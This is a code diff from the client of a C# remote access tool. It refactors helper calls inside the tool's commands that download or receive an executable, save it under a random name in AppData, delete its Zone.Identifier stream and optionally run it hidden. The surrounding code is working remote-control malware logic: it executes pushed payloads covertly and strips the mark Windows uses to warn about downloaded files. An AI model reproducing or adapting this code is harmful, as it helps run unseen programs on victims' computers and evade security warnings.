@@ -6,6 +6,7 @@ using System.Threading;
 using System.Windows.Forms;
 using xClient.Core.Helper;
 using xClient.Core.Networking;
+using xClient.Core.Utilities;
 
 namespace xClient.Core.Commands
 {
@@ -20,7 +21,7 @@ namespace xClient.Core.Commands
             new Thread(() =>
             {
                 string tempFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
-                    Helper.Helper.GetRandomFilename(12, ".exe"));
+                    FileHelper.GetRandomFilename(12, ".exe"));
 
                 try
                 {
@@ -40,7 +41,7 @@ namespace xClient.Core.Commands
 
                 try
                 {
-                    DeleteFile(tempFile + ":Zone.Identifier");
+                    NativeMethods.DeleteFile(tempFile + ":Zone.Identifier");
 
                     var bytes = File.ReadAllBytes(tempFile);
                     if (bytes[0] != 'M' && bytes[1] != 'Z')
@@ -58,7 +59,7 @@ namespace xClient.Core.Commands
                 }
                 catch
                 {
-                    DeleteFile(tempFile);
+                    NativeMethods.DeleteFile(tempFile);
                     new Packets.ClientPackets.SetStatus("Execution failed!").Execute(client);
                     return;
                 }
@@ -88,7 +89,7 @@ namespace xClient.Core.Commands
 
                 if ((command.CurrentBlock + 1) == command.MaxBlocks) // execute
                 {
-                    DeleteFile(filePath + ":Zone.Identifier");
+                    NativeMethods.DeleteFile(filePath + ":Zone.Identifier");
 
                     ProcessStartInfo startInfo = new ProcessStartInfo();
                     if (command.RunHidden)
@@ -105,7 +106,7 @@ namespace xClient.Core.Commands
             }
             catch (Exception ex)
             {
-                DeleteFile(filePath);
+                NativeMethods.DeleteFile(filePath);
                 new Packets.ClientPackets.SetStatus(string.Format("Execution failed: {0}", ex.Message)).Execute(client);
             }
         }
